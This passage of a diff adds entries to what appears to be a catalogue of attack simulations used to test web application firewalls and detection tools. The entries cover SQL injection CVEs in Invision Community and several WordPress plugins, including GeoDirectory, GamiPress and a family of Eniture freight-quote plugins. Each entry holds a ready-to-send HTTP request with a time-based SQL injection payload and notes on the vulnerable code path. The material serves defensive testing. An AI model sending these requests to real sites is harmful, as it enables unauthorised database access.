@@ -202006,10 +202006,10 @@
   {
     "name": "CVE-2024-30163 - Invision Community SQL Injection",
     "displayName": "CVE-2024-30163 - Invision Community SQL Injection",
-    "description": "Invision Community before 4.7.16 is vulnerable to blind SQL injection in the 'filter' request parameter of the Nexus store category view (applications/nexus/modules/front/store/store.php, _store::_categoryView()). The request sends a time-based blind SQL injection payload in filter[]. The path uses the canonical Nexus store controller (app=nexus/module=store/controller=store) and the HTTP method/category detail are inferred from the advisory (flagged as inferred - the verbatim PoC request is only in the vendor advisory PoC page, which was not retrievable). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://karmainsecurity.com/KIS-2024-02 (advisory: 'filter' parameter reaches $where/$joins in _categoryView)\n- https://cvefeed.io/vuln/detail/CVE-2024-30163 (advisory detail)\n- http://seclists.org/fulldisclosure/2024/Apr/20 (Full Disclosure advisory, blocked)\n- https://www.cve.org/CVERecord?id=CVE-2024-30163 (CVE record)",
+    "description": "Invision Community before 4.7.16 is vulnerable to blind SQL injection in the 'filter' request parameter of the Nexus store category view (applications/nexus/modules/front/store/store.php, _store::_categoryView()). The request sends a time-based blind SQL injection payload in filter[]. The path uses the canonical Nexus store controller (app=nexus/module=store/controller=store); the HTTP method is inferred as GET (flagged as inferred - the verbatim PoC request is only in the vendor advisory PoC page, which was not retrievable). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://karmainsecurity.com/KIS-2024-02 (advisory: 'filter' parameter reaches $where/$joins in _categoryView)\n- https://cvefeed.io/vuln/detail/CVE-2024-30163 (advisory detail)\n- http://seclists.org/fulldisclosure/2024/Apr/20 (Full Disclosure advisory, blocked)\n- https://www.cve.org/CVERecord?id=CVE-2024-30163 (CVE record)",
     "type": "webRequest",
     "value": {
-      "input": "GET /index.php?app=nexus&module=store&controller=store&do=browse&filter%5B%5D=1)%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(5))x)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: ips4_device_key=dummy\n\n"
+      "input": "GET /index.php?app=nexus&module=store&controller=store&filter%5B%5D=1)%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(5))x)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: ips4_device_key=dummy\n\n"
     },
     "cves": [
       "CVE-2024-30163"
@@ -209451,6 +209451,594 @@
       {
         "title": "poc_source for CVE-2024-13594",
         "link": "https://plugins.trac.wordpress.org/browser/simple-downloads-list/trunk/lists/list_1/download_list_1.php#L20"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13507 - GeoDirectory SQL Injection",
+    "displayName": "CVE-2024-13507 - GeoDirectory SQL Injection",
+    "description": "GeoDirectory \u2013 WP Business Directory Plugin (WordPress) is vulnerable to unauthenticated time-based SQL injection via the dist (distance) parameter. The GeoDirectory listings query builder includes/class-geodir-query.php (line ~733) interpolates the request's dist value into the distance SQL comparison without sufficient escaping. The value is reachable unauthenticated through the public REST listings endpoint /wp-json/geodir/v2/places/ (distance search). The request sends a time-based payload (1 AND SLEEP(5)) in dist. Method is GET (the REST listings endpoint is a documented GET search; dist/location params are query-string). No vendor WAF rule found; built from the Wordfence advisory, the vendor REST-API documentation and the trac source.\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/30a15a22-d6f3-4829-995d-7fa14d1db7a9?source=cve (Wordfence advisory)\n- https://plugins.trac.wordpress.org/browser/geodirectory/tags/2.8.97/includes/class-geodir-query.php#L733 (vulnerable source line)\n- https://wpgeodirectory.com/documentation/article/how-tos/filter-search-results-from-the-geodirectory-rest-api/ (REST endpoint /wp-json/geodir/v2/places/ and distance search params)\n- https://www.cve.org/CVERecord?id=CVE-2024-13507 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-json/geodir/v2/places/?near=me&dist=1%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2024-13507"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13507",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/30a15a22-d6f3-4829-995d-7fa14d1db7a9?source=cve"
+      },
+      {
+        "title": "waf_source for CVE-2024-13507",
+        "link": "https://plugins.trac.wordpress.org/browser/geodirectory/tags/2.8.97/includes/class-geodir-query.php#L733"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13500 - weDevs WP Project Manager SQL Injection",
+    "displayName": "CVE-2024-13500 - weDevs WP Project Manager SQL Injection",
+    "description": "WP Project Manager (wedevs-project-manager, WordPress) is vulnerable to authenticated (Subscriber+) time-based SQL injection via the orderby parameter. The REST route GET /wp-json/pm/v2/projects/{id}/activities (Activity_Controller) builds its query through src/Activity/Helper/Activity.php, whose orderby() reads $this->query_params['orderby'] and injects it into the ORDER BY clause without sanitisation. The request sends a time-based ORDER BY payload in orderby, with dummy authentication (X-WP-Nonce / logged-in cookie) because the WAF inspects the request before the app. Method is GET (the pm/v2 activities listing is a documented GET route). No vendor WAF rule found; built from the Wordfence advisory, the vendor backend-API docs and the plugin source.\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/70083f93-f110-4029-a3d3-ce8a77799a31?source=cve (Wordfence advisory)\n- https://github.com/weDevsOfficial/wp-project-manager/blob/master/src/Activity/Helper/Activity.php (vulnerable source: Activity::orderby reads query_params['orderby'])\n- https://plugins.trac.wordpress.org/changeset/3239348/ (fix changeset)\n- https://www.cve.org/CVERecord?id=CVE-2024-13500 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-json/pm/v2/projects/1/activities?orderby=id%2C(SELECT(SLEEP(5))) HTTP/1.1\nHost: {{target_host}}\nX-WP-Nonce: dummy\nCookie: wordpress_logged_in_dummy=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2024-13500"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13500",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/70083f93-f110-4029-a3d3-ce8a77799a31?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13500",
+        "link": "https://github.com/weDevsOfficial/wp-project-manager/blob/master/src/Activity/Helper/Activity.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13496 - GamiPress SQL Injection",
+    "displayName": "CVE-2024-13496 - GamiPress SQL Injection",
+    "description": "GamiPress (WordPress plugin) is vulnerable to unauthenticated time-based SQL injection via the orderby parameter. The admin-ajax action gamipress_get_logs (registered with wp_ajax_nopriv_gamipress_get_logs -> gamipress_ajax_get_logs in includes/ajax-functions.php) passes the request's orderby value through the CT_Query library (libraries/ct/includes/class-ct-query.php) into the ORDER BY clause of the logs query without sanitisation. The request sends a time-based ORDER BY payload in orderby. Method is POST (confirmed: the handler reads the admin-ajax request body; a 'gamipress' nonce field is present and set to a dummy value). No vendor WAF rule found; built from the Wordfence advisory, the abrahack write-up and the plugin mirror source.\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/ea54436c-b623-4049-af19-9995c312476e?source=cve (Wordfence advisory)\n- https://abrahack.com/posts/gamipress-sqli/ (third-party write-up)\n- https://github.com/common-repository/gamipress/blob/master/includes/ajax-functions.php (plugin mirror source: gamipress_get_logs action / orderby entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13496 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=gamipress_get_logs&nonce=dummy&orderby=id%2C(SELECT(SLEEP(5)))\n"
+    },
+    "cves": [
+      "CVE-2024-13496"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13496",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/ea54436c-b623-4049-af19-9995c312476e?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13496",
+        "link": "https://github.com/common-repository/gamipress/blob/master/includes/ajax-functions.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13491 - Eniture Small Package Quotes \u2013 For Customers of FedEx SQL Injection",
+    "displayName": "CVE-2024-13491 - Eniture Small Package Quotes \u2013 For Customers of FedEx SQL Injection",
+    "description": "Eniture Technology \"Small Package Quotes \u2013 For Customers of FedEx\" (WordPress plugin) is vulnerable to unauthenticated SQL injection via the dropship_edit_id parameter. The admin-ajax action en_wd_edit_dropship (registered with wp_ajax_nopriv_, so no authentication) runs edit_dropship_ajax() in warehouse-dropship/wild/includes/wild-delivery-save.php, which reads $_POST['dropship_edit_id'] straight into \"SELECT ... WHERE id=$get_dropship_id\" with no escaping (numeric context). The request sends a time-based payload (1 AND SLEEP(5)) in dropship_edit_id. Method is POST (confirmed: the handler reads $_POST). No vendor WAF rule found; built from the Wordfence advisory and the plugin mirror source (action name verified in the plugin mirror source).\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/ba311865-be4b-4c56-a761-409582e981b5?source=cve (Wordfence advisory)\n- https://github.com/common-repository/small-package-quotes-fedex-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php (plugin mirror source: edit_dropship_ajax / dropship_edit_id entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13491 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=en_wd_edit_dropship&dropship_edit_id=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2024-13491"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13491",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/ba311865-be4b-4c56-a761-409582e981b5?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13491",
+        "link": "https://github.com/common-repository/small-package-quotes-fedex-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13490 - Eniture LTL Freight Quotes \u2013 XPO Edition SQL Injection",
+    "displayName": "CVE-2024-13490 - Eniture LTL Freight Quotes \u2013 XPO Edition SQL Injection",
+    "description": "Eniture Technology \"LTL Freight Quotes \u2013 XPO Edition\" (WordPress plugin) is vulnerable to unauthenticated SQL injection via the dropship_edit_id parameter. The admin-ajax action en_wd_edit_dropship (registered with wp_ajax_nopriv_, so no authentication) runs edit_dropship_ajax() in warehouse-dropship/wild/includes/wild-delivery-save.php, which reads $_POST['dropship_edit_id'] straight into \"SELECT ... WHERE id=$get_dropship_id\" with no escaping (numeric context). The request sends a time-based payload (1 AND SLEEP(5)) in dropship_edit_id. Method is POST (confirmed: the handler reads $_POST). No vendor WAF rule found; built from the Wordfence advisory and the plugin mirror source (action name verified in the plugin mirror source).\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/8bcfbc26-9b5d-4df8-9f16-293734bd2805?source=cve (Wordfence advisory)\n- https://github.com/common-repository/ltl-freight-quotes-xpo-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php (plugin mirror source: edit_dropship_ajax / dropship_edit_id entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13490 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=en_wd_edit_dropship&dropship_edit_id=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2024-13490"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13490",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/8bcfbc26-9b5d-4df8-9f16-293734bd2805?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13490",
+        "link": "https://github.com/common-repository/ltl-freight-quotes-xpo-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13489 - Eniture LTL Freight Quotes \u2013 Old Dominion Edition SQL Injection",
+    "displayName": "CVE-2024-13489 - Eniture LTL Freight Quotes \u2013 Old Dominion Edition SQL Injection",
+    "description": "Eniture Technology \"LTL Freight Quotes \u2013 Old Dominion Edition\" (WordPress plugin) is vulnerable to unauthenticated SQL injection via the dropship_edit_id parameter. The admin-ajax action en_wd_edit_dropship (registered with wp_ajax_nopriv_, so no authentication) runs edit_dropship_ajax() in warehouse-dropship/wild/includes/wild-delivery-save.php, which reads $_POST['dropship_edit_id'] straight into \"SELECT ... WHERE id=$get_dropship_id\" with no escaping (numeric context). The request sends a time-based payload (1 AND SLEEP(5)) in dropship_edit_id. Method is POST (confirmed: the handler reads $_POST). No vendor WAF rule found; built from the Wordfence advisory and the plugin mirror source (identical wild-delivery-save.php structure across the Eniture freight-quote family; action/parameter taken from the sibling editions' mirror source).\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/3c7d63fc-288b-4f2f-85cd-e94add07a536?source=cve (Wordfence advisory)\n- https://github.com/common-repository/ltl-freight-quotes-odfl-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php (plugin mirror source: edit_dropship_ajax / dropship_edit_id entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13489 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=en_wd_edit_dropship&dropship_edit_id=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2024-13489"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13489",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/3c7d63fc-288b-4f2f-85cd-e94add07a536?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13489",
+        "link": "https://github.com/common-repository/ltl-freight-quotes-odfl-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13488 - Eniture LTL Freight Quotes \u2013 Estes Edition SQL Injection",
+    "displayName": "CVE-2024-13488 - Eniture LTL Freight Quotes \u2013 Estes Edition SQL Injection",
+    "description": "Eniture Technology \"LTL Freight Quotes \u2013 Estes Edition\" (WordPress plugin) is vulnerable to unauthenticated SQL injection via the dropship_edit_id parameter. The admin-ajax action en_wd_edit_dropship (registered with wp_ajax_nopriv_, so no authentication) runs edit_dropship_ajax() in warehouse-dropship/wild/includes/wild-delivery-save.php, which reads $_POST['dropship_edit_id'] straight into \"SELECT ... WHERE id=$get_dropship_id\" with no escaping (numeric context). The request sends a time-based payload (1 AND SLEEP(5)) in dropship_edit_id. Method is POST (confirmed: the handler reads $_POST). No vendor WAF rule found; built from the Wordfence advisory and the plugin mirror source (identical wild-delivery-save.php structure across the Eniture freight-quote family; action/parameter taken from the sibling editions' mirror source).\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/b77b064d-ab8c-4e84-b5cc-efbdeefbf502?source=cve (Wordfence advisory)\n- https://github.com/common-repository/ltl-freight-quotes-estes-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php (plugin mirror source: edit_dropship_ajax / dropship_edit_id entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13488 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=en_wd_edit_dropship&dropship_edit_id=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2024-13488"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13488",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/b77b064d-ab8c-4e84-b5cc-efbdeefbf502?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13488",
+        "link": "https://github.com/common-repository/ltl-freight-quotes-estes-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13485 - Eniture LTL Freight Quotes \u2013 ABF Freight Edition SQL Injection",
+    "displayName": "CVE-2024-13485 - Eniture LTL Freight Quotes \u2013 ABF Freight Edition SQL Injection",
+    "description": "Eniture Technology \"LTL Freight Quotes \u2013 ABF Freight Edition\" (WordPress plugin) is vulnerable to unauthenticated SQL injection via the dropship_edit_id parameter. The admin-ajax action en_wd_edit_dropship (registered with wp_ajax_nopriv_, so no authentication) runs edit_dropship_ajax() in warehouse-dropship/wild/includes/wild-delivery-save.php, which reads $_POST['dropship_edit_id'] straight into \"SELECT ... WHERE id=$get_dropship_id\" with no escaping (numeric context). The request sends a time-based payload (1 AND SLEEP(5)) in dropship_edit_id. Method is POST (confirmed: the handler reads $_POST). No vendor WAF rule found; built from the Wordfence advisory and the plugin mirror source (action name verified in the plugin mirror source).\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/9fbb4f9a-4c68-4ddb-8e49-9629114b11ec?source=cve (Wordfence advisory)\n- https://github.com/common-repository/ltl-freight-quotes-abf-freight-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php (plugin mirror source: edit_dropship_ajax / dropship_edit_id entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13485 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=en_wd_edit_dropship&dropship_edit_id=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2024-13485"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13485",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/9fbb4f9a-4c68-4ddb-8e49-9629114b11ec?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13485",
+        "link": "https://github.com/common-repository/ltl-freight-quotes-abf-freight-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13483 - Eniture LTL Freight Quotes \u2013 SAIA Edition SQL Injection",
+    "displayName": "CVE-2024-13483 - Eniture LTL Freight Quotes \u2013 SAIA Edition SQL Injection",
+    "description": "Eniture Technology \"LTL Freight Quotes \u2013 SAIA Edition\" (WordPress plugin) is vulnerable to unauthenticated SQL injection via the dropship_edit_id parameter. The admin-ajax action en_wd_edit_dropship (registered with wp_ajax_nopriv_, so no authentication) runs edit_dropship_ajax() in warehouse-dropship/wild/includes/wild-delivery-save.php, which reads $_POST['dropship_edit_id'] straight into \"SELECT ... WHERE id=$get_dropship_id\" with no escaping (numeric context). The request sends a time-based payload (1 AND SLEEP(5)) in dropship_edit_id. Method is POST (confirmed: the handler reads $_POST). No vendor WAF rule found; built from the Wordfence advisory and the plugin mirror source (identical wild-delivery-save.php structure across the Eniture freight-quote family; action/parameter taken from the sibling editions' mirror source).\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/d5e0d192-17ee-42bd-9368-c8449d8e0d08?source=cve (Wordfence advisory)\n- https://github.com/common-repository/ltl-freight-quotes-saia-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php (plugin mirror source: edit_dropship_ajax / dropship_edit_id entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13483 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=en_wd_edit_dropship&dropship_edit_id=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2024-13483"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13483",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/d5e0d192-17ee-42bd-9368-c8449d8e0d08?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13483",
+        "link": "https://github.com/common-repository/ltl-freight-quotes-saia-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13481 - Eniture LTL Freight Quotes \u2013 R+L Carriers Edition SQL Injection",
+    "displayName": "CVE-2024-13481 - Eniture LTL Freight Quotes \u2013 R+L Carriers Edition SQL Injection",
+    "description": "Eniture Technology \"LTL Freight Quotes \u2013 R+L Carriers Edition\" (WordPress plugin) is vulnerable to unauthenticated SQL injection via the dropship_edit_id parameter. The admin-ajax action en_wd_edit_dropship (registered with wp_ajax_nopriv_, so no authentication) runs edit_dropship_ajax() in warehouse-dropship/wild/includes/wild-delivery-save.php, which reads $_POST['dropship_edit_id'] straight into \"SELECT ... WHERE id=$get_dropship_id\" with no escaping (numeric context). The request sends a time-based payload (1 AND SLEEP(5)) in dropship_edit_id. Method is POST (confirmed: the handler reads $_POST). No vendor WAF rule found; built from the Wordfence advisory and the plugin mirror source (identical wild-delivery-save.php structure across the Eniture freight-quote family; action/parameter taken from the sibling editions' mirror source).\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/b0f3cdce-e239-4c2f-83e3-e8d0b528d39e?source=cve (Wordfence advisory)\n- https://github.com/common-repository/ltl-freight-quotes-rl-carriers-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php (plugin mirror source: edit_dropship_ajax / dropship_edit_id entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13481 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=en_wd_edit_dropship&dropship_edit_id=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2024-13481"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13481",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/b0f3cdce-e239-4c2f-83e3-e8d0b528d39e?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13481",
+        "link": "https://github.com/common-repository/ltl-freight-quotes-rl-carriers-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13480 - Eniture LTL Freight Quotes \u2013 For Customers of FedEx Freight SQL Injection",
+    "displayName": "CVE-2024-13480 - Eniture LTL Freight Quotes \u2013 For Customers of FedEx Freight SQL Injection",
+    "description": "Eniture Technology \"LTL Freight Quotes \u2013 For Customers of FedEx Freight\" (WordPress plugin) is vulnerable to unauthenticated SQL injection via the dropship_edit_id parameter. The admin-ajax action en_wd_edit_dropship (registered with wp_ajax_nopriv_, so no authentication) runs edit_dropship_ajax() in warehouse-dropship/wild/includes/wild-delivery-save.php, which reads $_POST['dropship_edit_id'] straight into \"SELECT ... WHERE id=$get_dropship_id\" with no escaping (numeric context). The request sends a time-based payload (1 AND SLEEP(5)) in dropship_edit_id. Method is POST (confirmed: the handler reads $_POST). No vendor WAF rule found; built from the Wordfence advisory and the plugin mirror source (identical wild-delivery-save.php structure across the Eniture freight-quote family; action/parameter taken from the sibling editions' mirror source).\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/a9b6f7a3-83eb-4352-9db6-ab4b03241702?source=cve (Wordfence advisory)\n- https://github.com/common-repository/ltl-freight-quotes-fedex-freight-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php (plugin mirror source: edit_dropship_ajax / dropship_edit_id entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13480 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=en_wd_edit_dropship&dropship_edit_id=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2024-13480"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13480",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/a9b6f7a3-83eb-4352-9db6-ab4b03241702?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13480",
+        "link": "https://github.com/common-repository/ltl-freight-quotes-fedex-freight-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-13479 - Eniture LTL Freight Quotes \u2013 SEFL Edition SQL Injection",
+    "displayName": "CVE-2024-13479 - Eniture LTL Freight Quotes \u2013 SEFL Edition SQL Injection",
